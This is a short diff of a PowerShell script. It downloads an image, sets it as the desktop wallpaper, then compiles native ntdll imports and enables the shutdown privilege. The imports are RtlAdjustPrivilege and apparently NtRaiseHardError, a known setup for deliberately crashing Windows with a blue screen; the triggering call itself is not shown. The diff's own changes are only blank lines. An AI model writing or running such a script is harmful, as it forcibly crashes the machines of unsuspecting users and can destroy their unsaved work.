@@ -1,7 +1,11 @@
 $url  = "https://pic3.zhimg.com/v2-f7c45a855f5881818fe36e8c3ab5645e_r.jpg"
 $path = "$env:TEMP\v2-f7c45a855f5881818fe36e8c3ab5645e_r.jpg"
+
+
 $wc = New-Object System.Net.WebClient
 $wc.DownloadFile($url, $path)
+
+
 if (-not ("Wallpaper" -as [type])) {
     Add-Type @"
     using System;
@@ -12,10 +16,14 @@ if (-not ("Wallpaper" -as [type])) {
     }
 "@
 }
+
+
 $result = [Wallpaper]::SystemParametersInfo(20, 0, $path, 0x01 -bor 0x02)
+
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
+
 public class Native {
     [DllImport("ntdll.dll")]
     public static extern uint RtlAdjustPrivilege(
@@ -27,6 +35,7 @@ public class Native {
         IntPtr Parameters, uint ValidResponseOption, out uint Response);
 }
 "@
+
 $old = $false
 [Native]::RtlAdjustPrivilege(19, $true, $false, [ref]$old) | Out-Null
 
